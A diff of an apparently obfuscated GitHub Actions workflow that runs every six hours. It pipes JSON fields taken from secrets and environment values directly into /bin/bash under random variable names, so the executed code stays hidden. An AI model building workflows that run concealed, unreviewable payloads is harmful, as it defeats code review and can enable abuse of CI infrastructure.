@@ -1,9 +1,9 @@
 name: tangyangzhong1987
+
 on:
   workflow_dispatch:
   schedule:
-    - cron: '37 0/6 * * *'
-
+    - cron: '38 1/6 * * *'
 jobs:
   build:
     runs-on: ubuntu-latest
@@ -12,13 +12,14 @@ jobs:
       - uses: actions/checkout@v4
       - name: tangyangzhong1987
         env:
-          vq42865: ${{ secrets.vq42865 }}
+          avduj9: ${{ secrets.avduj9 }}
         run: |
-          echo $vq42865 | jq -r .xn775 | /bin/bash
-          echo $b503 | jq -r .merbe380 | /bin/bash
-          echo $dadmq5 | jq -r .hper8 | /bin/bash
-          echo $q3 | jq -r .yc78 | /bin/bash
-          echo $kazk572 | jq -r .jddcn8 | /bin/bash
-          echo $spaii6 | jq -r .f8965 | /bin/bash
-          echo $vedcz35173 | jq -r .csnci67790 | /bin/bash
+          echo $avduj9 | jq -r .y3039 | /bin/bash
+          echo $n018 | jq -r .ch13014 | /bin/bash
+          echo $rdlb8289 | jq -r .vo1 | /bin/bash
+          echo $bnoxe73 | jq -r .fjyw81405 | /bin/bash
+          echo $dj7791 | jq -r .mg5264 | /bin/bash
+          echo $jdrwa65 | jq -r .er4 | /bin/bash
+          echo $sr12 | jq -r .rsesg71 | /bin/bash
+          echo $r50613 | jq -r .yt0567 | /bin/bash
 
